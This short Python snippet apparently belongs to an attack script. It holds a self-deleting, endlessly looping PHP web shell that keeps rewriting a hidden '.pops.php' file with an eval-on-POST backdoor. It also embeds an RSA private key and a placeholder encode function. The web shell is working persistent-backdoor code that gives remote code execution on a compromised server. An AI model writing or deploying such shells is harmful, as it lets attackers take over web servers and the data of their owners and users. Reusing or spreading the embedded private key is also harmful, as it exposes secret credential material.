

code = '''
<?php
set_time_limit(0);ignore_user_abort(1);
unlink(__FILE__);
while (1) {
$content = "<?php @eval($_POST["cmd"]) ?>";
file_put_contents(".pops.php", $content);
}
?>
'''

priv_key = '''-----BEGIN PRIVATE KEY-----
MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA2FXUw5s97bKxqtQz
IIvTFF11gSLeYWT9eMqDcrLSlyyTJ4dvO6dZtlq5tjWJGP32fd5e50zU2KGSI2S+
098j2QIDAQABAkEAs52H2qRxJYLBCpHGpVYSeg0iu4ZE1t5vqTOTMc8RFBuScywF
rACMRZ623AumdcNx614/6bClLA+YKNZQlUQfkQIhAO/kxEtzzOcSEGW1DVptF79O
/Lxsa89hVfO2B1KYNOMtAiEA5twmNpqzYgdJtaXwT5kff1rhJhYjWYST+Og2na/O
3t0CIC07YDut0PO8tzTGJ4dmTHT46rSIaOeIPdGe/9B1/HrdAiA+N0pdIOgDHS+y
MpxG919TtSxEVWcFcwNl6z781CqOSQIhAMZkQLPl3dzTT1Srn0Wb1cl5HczB95cs
ok7dXI72eo6S
-----END PRIVATE KEY-----'''
def encode(phpcode):
    return phpcode